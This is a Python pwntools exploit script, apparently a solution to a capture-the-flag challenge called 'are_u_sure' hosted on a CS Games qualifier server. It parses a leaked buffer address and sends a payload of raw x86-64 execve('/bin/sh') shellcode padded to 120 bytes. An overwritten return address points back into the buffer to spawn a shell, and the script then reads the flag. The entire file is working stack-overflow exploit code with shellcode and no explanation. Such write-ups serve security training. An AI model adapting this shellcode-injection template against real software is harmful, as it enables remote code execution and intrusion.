#!/usr/bin/env python2
from pwn import *

host = "csgames-quals.frigon.app"
port = 8001
binary_path = "./are_u_sure"
lib_path = None

context.update(arch="amd64", os="linux")

def get_process():
    if args["REMOTE"]:
        return remote(host, port)
    else:
        if lib_path is None:
            return process(binary_path)
        else:
            return process([binary_path], env={"LD_PRELOAD": lib_path})

if lib_path is not None:
    lib = ELF(lib_path)

payload = ""
p = get_process()

if args["PAUSE"]:
    pause()

p.sendlineafter("Alright, you passed the first test, what's your name?\n", "AAAA")
p.recvuntil("Thanks AAAA, I've stored your name at ")
name_addr = p.recvuntil(" if you're looking for it.", drop=True)
name_addr = int(name_addr, 16)
print(hex(name_addr))

#payload += asm(shellcraft.execve("/bin/sh", 0, 0))
payload += 'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
payload = payload.ljust(120, 'A')
payload += p64(name_addr - 0x30)

p.sendlineafter("ARE YOU SURE YOU'RE UP FOR THE CHALLENGE ?!?!\n", payload)

p.sendline("cat flag")

p.interactive()

